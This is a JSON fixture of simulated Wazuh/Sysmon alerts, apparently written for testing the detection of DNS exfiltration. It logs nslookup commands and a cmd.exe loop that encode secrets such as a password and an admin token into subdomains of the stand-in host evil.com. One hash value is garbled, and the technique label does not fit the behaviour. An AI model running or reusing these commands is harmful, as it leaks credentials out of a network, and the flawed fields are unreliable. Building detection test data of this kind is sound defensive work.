@@ -1,0 +1,226 @@
+{
+  "_metadata": {
+    "attack_id": "T1048.002",
+    "variation": "001",
+    "name": "DNS Exfiltration via nslookup Subdomain Encoding",
+    "description": "Attacker exfiltrates data by encoding it in DNS subdomain queries using nslookup. Data chunks are Base64-encoded and prepended as subdomains to an attacker-controlled domain (evil.com). This bypasses network egress controls that block direct connections.",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - nslookup.exe resolving first exfiltration subdomain chunk",
+      "sequence": 1,
+      "timestamp": "2026-02-21T01:25:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: nslookup resolving suspicious long subdomain - DNS exfiltration indicator",
+          "id": "100360",
+          "mitre": {
+            "id": [
+              "T1048.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708471500.100360",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:25:00.000",
+              "processGuid": "{d9f4bac3-7eb0-9b4d-3f00-000000001400}",
+              "processId": "6712",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "commandLine": "nslookup c2data-exfil-chunk1-U2VjcmV0UGFzc3dvcmQ.evil.com",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "logonGuid": "{d9f4bac3-7e90-9b4d-4a8e-3f0000000000}",
+              "logonId": "0x4a8e3f",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=458d78fc tried to2c0b4abe8c3c27e6a3edcb9f01d5faba7badb5c4eebc96e8e64dd2",
+              "parentProcessGuid": "{d9f4bac3-7e92-9b4d-3e00-000000001400}",
+              "parentProcessId": "4920",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c for /L %i in (1,1,10) do nslookup c2data-exfil-chunk%i.evil.com"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 22 - DNS query for exfiltration subdomain captured by Sysmon DNS logging",
+      "sequence": 2,
+      "timestamp": "2026-02-21T01:25:01.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 22: DNS query to suspicious long subdomain - data exfiltration via DNS",
+          "id": "100361",
+          "mitre": {
+            "id": [
+              "T1048.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708471501.100361",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:25:01.000",
+              "processGuid": "{d9f4bac3-7eb0-9b4d-3f00-000000001400}",
+              "processId": "6712",
+              "queryName": "c2data-exfil-chunk1-U2VjcmV0UGFzc3dvcmQ.evil.com",
+              "queryStatus": "0",
+              "queryResults": "type:  5 NXDOMAIN",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "user": "CORP\\attacker"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Second nslookup for chunk2 of exfiltrated data",
+      "sequence": 3,
+      "timestamp": "2026-02-21T01:25:05.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: nslookup resolving second exfiltration chunk - continued DNS data theft",
+          "id": "100362",
+          "mitre": {
+            "id": [
+              "T1048.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708471505.100362",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:25:05.000",
+              "processGuid": "{d9f4bac3-7eb5-9b4d-4000-000000001400}",
+              "processId": "6740",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "commandLine": "nslookup c2data-exfil-chunk2-QWRtaW5Ub2tlbj0xMjM0.evil.com",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "logonGuid": "{d9f4bac3-7e90-9b4d-4a8e-3f0000000000}",
+              "logonId": "0x4a8e3f",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=458d78fc2c0b4abe8c3c27e6a3edcb9f01d5faba7badb5c4eebc96e8e64dd2a1",
+              "parentProcessGuid": "{d9f4bac3-7e92-9b4d-3e00-000000001400}",
+              "parentProcessId": "4920",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c for /L %i in (1,1,10) do nslookup c2data-exfil-chunk%i.evil.com"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
